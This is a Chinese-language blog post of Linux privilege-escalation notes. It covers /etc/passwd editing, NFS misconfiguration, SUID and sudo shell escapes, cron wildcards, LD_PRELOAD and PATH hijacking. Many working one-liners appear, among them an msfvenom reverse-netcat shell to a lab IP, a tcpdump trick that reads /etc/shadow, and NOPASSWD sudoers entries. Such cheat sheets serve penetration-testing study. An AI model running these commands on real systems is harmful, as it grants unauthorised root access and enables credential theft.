---
title: "Linux Authorization Skills"
date: 2019-07-19T17:20:20+08:00
lastmod: 2019-07-19T17:20:20+08:00
draft: false
tags: [LInux]
categories: []
comment: true
---
Linux提权技巧
<!--more-->
# Linux Authorization Skills

## 编辑-etc-passwd文件进行权限升级

- 使用cat打开/etc/passwd查看可用用户
`cat /etc/passwd`
![](https://ae01.alicdn.com/kf/HTB1r3GVaUY1gK0jSZFCq6AwqXXaY.jpg)
++可以看到可用用户++
- 添加用户（查看用户信息）
![](https://ae01.alicdn.com/kf/HTB1b3uVaUD1gK0jSZFGq6zd3FXa8.jpg)


==这里是正文==
> 前提：用户具有读/写/etc/passwd权限
**这里我用root尝试**
- 手动修改etc/passwd文件
![](https://ae01.alicdn.com/kf/HTB1OlWWaUH1gK0jSZSyq6xtlpXau.jpg)

- /etc/group文件中对其进行处理
![](https://ae01.alicdn.com/kf/HTB1YwKYaUT1gK0jSZFrq6ANCXXaO.jpg)

- 设置密码
![](https://ae01.alicdn.com/kf/HTB1znCYaUz1gK0jSZLeq6z9kVXa0.jpg)
>由于我们在不使用adduser命令的情况下手动创建了一个新用户syst1m，因此在/etc/shadow文件中找不到任何有关信息。但是它在/etc/passwd文件中，此处*符号已被加密密码值替换。通过这种方式，我们可以创建自己的用户以进行权限提升。

- 无法执行passwd命令设置用户密码
1.Openssl
`openssl passwd -1 -salt user3 pass123`
2.mkpasswd
`mkpasswd -m SHA-512 pass`
3.Python
`python -c 'import crypt; print crypt.crypt("pass", "$6$salt")`
4.Perl
`perl -le 'print crypt("pass123", "abc")'`
5.PHP
`php -r "print(crypt('aarti','123') . \"\n\");"`
**修改*号处的密码即可**

## 配置错误的NFS的Linux权限升级

> 核心文件（/etc/exports，/etc/hosts.allow和/etc/hosts.deny.要配置弱的NFS服务器，只查看/etc/export文件）

- 环境配置（安装nfs）
![](https://ae01.alicdn.com/kf/HTB1n5y3aFT7gK0jSZFpq6yTkpXag.jpg)

- 编辑/etc/export
> etc/export文件

![](https://ae01.alicdn.com/kf/HTB1WGC7aND1gK0jSZFsq6zldVXaS.jpg)
![](https://ae01.alicdn.com/kf/HTB1Kpi8aHr1gK0jSZFDq6z9yVXay.jpg)

- 扫描NFS共享

1.NMAP

`nmap -sV --script=nfs-showmount 192.168.1.1`
![](https://ae01.alicdn.com/kf/HTB1RAe9aKH2gK0jSZJnq6yT1FXaO.jpg)

2.showmount
![](https://ae01.alicdn.com/kf/HTB1Db5_aRr0gK0jSZFnq6zRRXXan.jpg)

- 利用NFS服务器进行提权技巧

1.Bash文件
![](https://ae01.alicdn.com/kf/HTB1HvjjaQH0gK0jSZPiq6yvapXan.jpg)

2.C程序（来源互联网）
![](https://ae01.alicdn.com/kf/HTB1xYjnaND1gK0jSZFKq6AJrVXav.jpg)

3.Nano/Vi（来源互联网）
![](https://ae01.alicdn.com/kf/HTB1pO2maQT2gK0jSZFkq6AIQFXaH.jpg)


4.Sudoers文件
`nano -p /etc/sudoers`
`ignite ALL=(ALL:ALL) NOPASSWD: ALL`

## 通过自动脚本快速识别Windows系统上潜在的权限提升选项

- LinuEnum
> git clone https://github.com/rebootuser/LinEnum.git

![](https://ae01.alicdn.com/kf/HTB1JyPxaSf2gK0jSZFPq6xsopXap.jpg)
![](https://ae01.alicdn.com/kf/HTB1rcvxaKL2gK0jSZPhq6yhvXXa5.jpg)

![](https://ae01.alicdn.com/kf/HTB1g.2zaND1gK0jSZFKq6AJrVXaL.jpg)
![](https://ae01.alicdn.com/kf/HTB17QLyaUT1gK0jSZFrq6ANCXXaJ.jpg)

- Linuxprivchecker(枚举系统配置并运行一些权限提升检查)
`wget http://www.securitysift.com/download/linuxprivchecker.py`

![](https://ae01.alicdn.com/kf/HTB1zrs4X1bviK0jSZFNq6yApXXa2.jpg)

- Linux Exploit Suggester 2(返回可能的漏洞利用列表)

![](https://ae01.alicdn.com/kf/HTB1vlbEaND1gK0jSZFKq6AJrVXaO.jpg)
- Bashark

![](https://cy-pic.kuaizhan.com/g3/0f/ba/cd77-4a95-437d-aa2e-8db0202d8fa153)
![](https://ae01.alicdn.com/kf/HTB1so6EaHr1gK0jSZR0q6zP8XXat.jpg)

- BeRoot
`git clone https://github.com/AlessandroZ/BeRoot.git`
> 用于检查常见的错误配置，以找到提升权限的方法
检查文件权限
SUID bin
NFS root压缩
Docker
Sudo规则
内核利用

`./beroot.py`
![](https://ae01.alicdn.com/kf/HTB1DpPFaKT2gK0jSZFvq6xnFXXaq.jpg)


## Cron计划任务Linux权限技巧

- 环境

![](https://ae01.alicdn.com/kf/HTB14Ov0aV67gK0jSZPfq6yhhFXaP.jpg)

![](https://ae01.alicdn.com/kf/HTB1JxH2a1L2gK0jSZPhq6yhvXXax.jpg)

- 利用
![](https://ae01.alicdn.com/kf/HTB1zib9a7T2gK0jSZFkq6AIQFXal.jpg)

![](https://ae01.alicdn.com/kf/HTB1JJz9a.D1gK0jSZFGq6zd3FXad.jpg)

- Crontab Tar通配符注射
> https://xz.aliyun.com/t/2401


## 使用SUID二进制文件进行Linux提权

### 使用 "cp"进行提权

![](https://ae01.alicdn.com/kf/HTB1iOf8aW67gK0jSZFHq6y9jVXan.jpg)

- 第一种方法(复制passwd)
1.寻找具有SUID的文件
![](https://ae01.alicdn.com/kf/HTB1Ohj.aYr1gK0jSZFDq6z9yVXam.jpg)
2. 复制passwd
![](https://ae01.alicdn.com/kf/HTB1odL.a7Y2gK0jSZFgq6A5OFXaj.jpg)
3.下载修改并让目标下载替换
![](https://ae01.alicdn.com/kf/HTB1UIwaa1L2gK0jSZFmq6A7iXXau.jpg)

- 第二种方法(传输后门)
生成反向连接（利用计划任务bash）
`msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.108 lport=1234 R`

### 使用Find命令进行提权
- 环境
![](https://ae01.alicdn.com/kf/HTB1lM7caYr1gK0jSZR0q6zP8XXaY.jpg)
![](https://ae01.alicdn.com/kf/HTB1qn0DaubviK0jSZFNq6yApXXaF.jpg)

### 使用vim进行提权
- 环境
![](https://ae01.alicdn.com/kf/HTB1JbQda1H2gK0jSZJnq6yT1FXaI.jpg)

- 利用
==sudoers文件==
![](https://ae01.alicdn.com/kf/HTB15yMda7L0gK0jSZFxq6xWHVXaG.jpg)

### Other
```
nano修改passwd
```


```
运行suid脚本
```
```
老版本的nmap（2.02-5.21）
nmap --interactive
lsh
whoami
msf exploit/unix/local/setuid_nmap
```
```
bash
nash -p
id
```

```
less
less /etc/passwd
!/bin/sh
```

```
more
more /home/pelle/myfile
!/bin/bash
```

```
AWk `awk 'BEGIN {system("/bin/bash")}`
```
```
man
man passwd
!/bin/bash
```
```
man
tcpdump
echo $'id\ncat /etc/shadow' > /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

## 使用sudo进行Linux提权
> /etc/sudoers文件（sudo权限的配置文件）

- 检查用户sudo权限
`sudo -l`

- 传统分配root权限方法
`visudo`
`raaz ALL=(ALL:ALL) ALL`/`raaz ALL=(ALL)ALL`
`sudo su `
`id`
- 分配root权限默认方法
`visudo`
`raaz ALL=ALL`/`raaz ALL=(root) ALL`
`sudo su` / `sudo bash`

### 技巧

- 允许二进制命令的root权限
`raaz ALL=(root) NOPASSWD: /usr/bin/find`
`sudo find /home -exec /bin/bash \;`
`id`
- 允许二进制程序的root权限
`raaz ALL= (root) NOPASSWD: /usr/bin/perl, /usr/bin/python, /usr/bin/less, /usr/bin/awk, /usr/bin/man, /
usr/bin/vi`

**perl**
`sudo perl -e 'exec "/bin/bash";'`
**python**
`sudo python -c 'import pty;pty.spawn("/bin/bash")`
**less**
`sudo less /etc/hosts`
`编辑器中输入!bash，按enter生成`
**awk**
`sudo awk 'BEGIN {system("/bin/bash")}'`
**man**
`sudo man man`
`编辑器中输入!bash，按enter生成`
**vi**
`sudo vi`
`编辑器中输入!bash，按enter生成`

- 允许shell脚本的root权限
`sudo /bin/script/asroot.py`
`id`

- 允许其他程序的sudo权限
`raaz ALL=(ALL) NOPASSWD: /usr/bin/env, /usr/bin/ftp, /usr/bin/scp, /usr/bin/socat`

**环境生成shell**

`sudo env /bin/bash`
**ftp**
`sudo ftp`
`! /bin/bash`
`whoami`

**通过SCP生成shell**
 `scp SourceFile user@host:~/目录路径`
 
 
 ## 使用LD_Preload提权
 - 打开/etc/sudoers
 `visudo`
 `test ALL=(ALL:ALL) NOPASSWD: /usr/bin/find`
 `Defaults env_keep += LD_PRELOAD`
 ![](https://ae01.alicdn.com/kf/HTB1o4koaYj1gK0jSZFuq6ArHpXao.jpg)
 
 - 利用
 ![](https://ae01.alicdn.com/kf/HTB1cl7oaYj1gK0jSZFuq6ArHpXaw.jpg)
 - 新建shell.c
 ![](https://ae01.alicdn.com/kf/HTB1wOAna4z1gK0jSZSgq6yvwpXa7.jpg)
- 使用gcc编译
![](https://ae01.alicdn.com/kf/HTB1QAwDa1H2gK0jSZJnq6yT1FXaQ.jpg)

- 执行
![](https://ae01.alicdn.com/kf/HTB1d5oDa.Y1gK0jSZFMq6yWcVXaB.jpg)
 ## 使用通配符提权
 > `*` 星号匹配文件名中的任意数量的字符，包括无
 `？` 问号匹配任何单个字符
 `[]` 括号内包含一组字符，其中任何一个字符都可以匹配该位置的单个字符
 `- []`中使用的连字符表示字符范围
 `〜` 字符开头的~扩展为主目录的名称。将另一个用户的登录名附加到该字符中，它指的是该用户的主目录
 
### 在野通配符
![](https://ae01.alicdn.com/kf/HTB1OLNbbeH2gK0jSZJnq6yT1FXaM.jpg)
### 文件劫持示例
**1.文件所有者通过Chown劫持**
- 普通用户
![](https://ae01.alicdn.com/kf/HTB14lXcbhz1gK0jSZSgq6yvwpXaH.jpg)
- root用户
![](https://ae01.alicdn.com/kf/HTB1.U4bbXP7gK0jSZFjq6A5aXXaz.jpg)
 ## 使用PATH变量进行提权
 
>查看相关用户路径
>`echo $PATH`

### PATH变量提权方法一
- demo.c
![](https://ae01.alicdn.com/kf/HTB1pPZKa1H2gK0jSZJnq6yT1FXad.jpg)
![](https://ae01.alicdn.com/kf/HTB1T3cLa.Y1gK0jSZFCq6AwqXXaU.jpg)

- 权限提升
**查看程序**
![](https://ae01.alicdn.com/kf/HTB15NwKaYr1gK0jSZFDq6z9yVXa9.jpg)
**1.echo生成root权限**
![](https://ae01.alicdn.com/kf/HTB1blZQaVP7gK0jSZFjq6A5aXXaT.jpg)
![](https://ae01.alicdn.com/kf/HTB1OrATa4v1gK0jSZFFq6z0sXXaQ.jpg)
**复制命令**
![](https://ae01.alicdn.com/kf/HTB1SeAUa4v1gK0jSZFFq6z0sXXa7.jpg)
**symlink命令**
![](https://ae01.alicdn.com/kf/HTB1YXMWa1H2gK0jSZJnq6yT1FXaD.jpg)

![](https://ae01.alicdn.com/kf/HTB1X5IVa7L0gK0jSZFtq6xQCXXaE.jpg)